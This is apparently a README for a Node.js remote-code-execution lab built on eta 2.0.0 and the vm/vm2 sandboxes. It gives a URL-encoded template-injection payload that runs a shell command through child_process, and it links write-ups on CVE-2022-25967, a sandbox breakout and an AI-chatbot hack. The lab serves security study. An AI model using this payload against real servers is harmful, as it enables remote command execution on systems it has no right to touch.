# Node_RCE_lab

## Requirements
-  Linux/Windows
-  Node
-  Npm
-  Express
-  Vm
-  Vm2
-  eta@2.0.0

## payload

- ";process.mainModule.require(%27child_process%27).execSync(%27whoami%27)//

  
## Reference
https://rayhan0x01.github.io/ctf/2023/04/01/finding-rce-in-eta-cve-2022-25967.html

https://security.snyk.io/vuln/SNYK-JS-ETA-2936803

https://core-research-team.github.io/2023-03-29/Nodejs-VM-Sandbox-Breakout

https://www.breachproof.net/blog/lethal-injection-how-we-hacked-microsoft-ai-chat-bot

